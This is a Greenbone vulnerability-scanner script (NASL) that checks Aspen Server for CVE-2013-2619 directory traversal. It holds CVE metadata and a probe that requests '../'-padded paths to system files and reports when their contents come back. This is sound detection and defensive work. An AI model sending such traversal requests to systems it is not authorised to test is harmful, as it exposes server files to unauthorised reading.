# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803367");
  script_version("2023-07-27T05:05:08+0000");
  script_cve_id("CVE-2013-2619");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-04-04 12:47:57 +0530 (Thu, 04 Apr 2013)");
  script_name("Aspen Sever Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24915");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121035");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/aspen-08-directory-traversal");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Aspen/banner");

  script_tag(name:"insight", value:"The flaw is due to the program not properly sanitizing user supplied input.");

  script_tag(name:"solution", value:"Upgrade to Aspen Server 0.22 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Aspen Server is prone to a directory traversal vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Aspen Server version 0.8 and prior");

  script_xref(name:"URL", value:"http://aspen.io");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:8080);

banner = http_get_remote_headers(port:port);

if("Server: Aspen" >< banner)
{
  files = traversal_files();

  foreach file (keys(files))
  {
    url = "/" + crap(data:"../",length:15) + files[file];

    if(http_vuln_check(port:port, url:url, pattern:file))
    {
      report = http_report_vuln_url( port:port, url:url );
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
